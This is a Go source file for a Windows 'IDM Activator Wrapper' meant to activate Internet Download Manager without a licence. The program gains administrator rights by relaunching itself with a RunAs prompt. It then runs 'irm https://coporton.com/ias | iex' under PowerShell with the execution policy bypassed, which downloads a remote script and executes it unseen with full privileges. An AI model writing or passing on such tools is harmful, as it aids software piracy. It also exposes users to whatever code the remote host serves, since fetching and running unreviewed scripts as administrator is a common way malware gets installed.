package main

import (
	"bufio"
	"flag"
	"fmt"
	"io"
	"os"
	"os/exec"
	"runtime"
	"strings"
)

// ANSI color codes
const (
	reset  = "\033[0m"
	green  = "\033[32m"
	cyan   = "\033[36m"
	yellow = "\033[33m"
	red    = "\033[31m"
)

const appVersion = "1.0.1"

func main() {
	// 1. OS Compatibility Guard
	if runtime.GOOS != "windows" {
		fmt.Println(red + "❌ Error: This tool is only supported on Windows." + reset)
		os.Exit(1)
	}

	dryRun := flag.Bool("dry-run", false, "Preview the command without executing")
	quiet := flag.Bool("q", false, "Skip confirmation prompt")
	version := flag.Bool("v", false, "Print version information")
	versionLong := flag.Bool("version", false, "Print version information")
	logFile := flag.Bool("log", false, "Save output to idm-activation.log")
	
	// Check for a hidden flag we pass to the elevated process so it knows it was elevated
	isElevatedParam := flag.Bool("elevated", false, "Internal flag")
	
	flag.Parse()

	// 2. Version Flag
	if *version || *versionLong {
		fmt.Printf("IDM Activator Wrapper v%s by Myst-25\n", appVersion)
		return
	}

	// ------- YOUR AWESOME BANNER -------
	fmt.Print(cyan)
	fmt.Println(`
 /$$      /$$                       /$$              /$$$$$$  /$$$$$$$ 
| $$$    /$$$                      | $$             /$$__  $$| $$____/ 
| $$$$  /$$$$ /$$   /$$  /$$$$$$$ /$$$$$$          |__/  \ $$| $$      
| $$ $$/$$ $$| $$  | $$ /$$_____/|_  $$_/   /$$$$$$  /$$$$$$/| $$$$$$$ 
| $$  $$$| $$| $$  | $$|  $$$$$$   | $$    |______/ /$$____/ |_____  $$
| $$\  $ | $$| $$  | $$ \____  $$  | $$ /$$        | $$       /$$  \ $$
| $$ \/  | $$|  $$$$$$$ /$$$$$$$/  |  $$$$/        | $$$$$$$$|  $$$$$$/
|__/     |__/ \____  $$|_______/    \___/          |________/ \______/ 
              /$$  | $$                                                
             |  $$$$$$/                                                
              \______/                                                 
`)
	fmt.Print(reset)

	// 3. Auto-Admin Elevation
	if !isAdmin() {
		if *isElevatedParam {
			// Prevent infinite elevation loops if elevation failed
			fmt.Println(red + "❌ Failed to acquire Administrator privileges." + reset)
			os.Exit(1)
		}

		fmt.Println(yellow + "⚠️  Administrator privileges required." + reset)
		fmt.Println(cyan + "Attempting to elevate privileges..." + reset)
		
		err := elevateSelf()
		if err != nil {
			fmt.Printf(red+"❌ Elevation failed: %v\n"+reset, err)
			fmt.Println("Please right-click the .exe and select 'Run as administrator'.")
			pauseIfRequired(*quiet)
			os.Exit(1)
		}
		// Exit original unprivileged process
		return
	}

	// Confirmation
	if !*quiet {
		fmt.Print("Proceed with activation? (yes/no): ")
		reader := bufio.NewReader(os.Stdin)
		input, _ := reader.ReadString('\n')
		if strings.TrimSpace(strings.ToLower(input)) != "yes" {
			fmt.Println("Cancelled.")
			pauseIfRequired(*quiet)
			return
		}
	}

	if *dryRun {
		fmt.Println("\n[DRY RUN] Would execute:")
		fmt.Println("powershell.exe -ExecutionPolicy Bypass -Command \"irm https://coporton.com/ias | iex\"")
		pauseIfRequired(*quiet)
		return
	}

	fmt.Println(green + "\n▶ Executing script... (this may take a minute)" + reset)

	cmd := exec.Command("powershell.exe",
		"-ExecutionPolicy", "Bypass",
		"-Command", "irm https://coporton.com/ias | iex",
	)

	// 4. Logging Support
	if *logFile {
		file, err := os.OpenFile("idm-activation.log", os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0666)
		if err != nil {
			fmt.Printf(red+"❌ Failed to create log file: %v\n"+reset, err)
			cmd.Stdout = os.Stdout
			cmd.Stderr = os.Stderr
		} else {
			defer file.Close()
			fmt.Println(cyan + "📝 Logging output to idm-activation.log" + reset)
			multiWriter := io.MultiWriter(os.Stdout, file)
			cmd.Stdout = multiWriter
			cmd.Stderr = multiWriter
		}
	} else {
		cmd.Stdout = os.Stdout
		cmd.Stderr = os.Stderr
	}

	err := cmd.Run()
	if err != nil {
		fmt.Printf(red+"\n❌ Failed: %v\n"+reset, err)
		pauseIfRequired(*quiet)
		os.Exit(1)
	}

	fmt.Println(green + "\n✅ Done." + reset)
	pauseIfRequired(*quiet)
}

func isAdmin() bool {
	cmd := exec.Command("net", "session")
	err := cmd.Run()
	return err == nil
}

func elevateSelf() error {
	exe, err := os.Executable()
	if err != nil {
		return err
	}
	
	// Pass existing arguments plus an internal flag to prevent infinite loops
	var args []string
	for _, arg := range os.Args[1:] {
		// Prevent duplicate --elevated flags
		if arg != "-elevated" && arg != "--elevated" {
			args = append(args, arg)
		}
	}
	args = append(args, "-elevated")
	argsStr := strings.Join(args, " ")
	
	psCmd := fmt.Sprintf("Start-Process -FilePath '%s' -ArgumentList '%s' -Verb RunAs", exe, argsStr)
	
	cmd := exec.Command("powershell", "-NoProfile", "-WindowStyle", "Normal", "-Command", psCmd)
	return cmd.Run()
}

func pauseIfRequired(quiet bool) {
	if !quiet {
		fmt.Println("\nPress Enter to exit...")
		bufio.NewReader(os.Stdin).ReadBytes('\n')
	}
}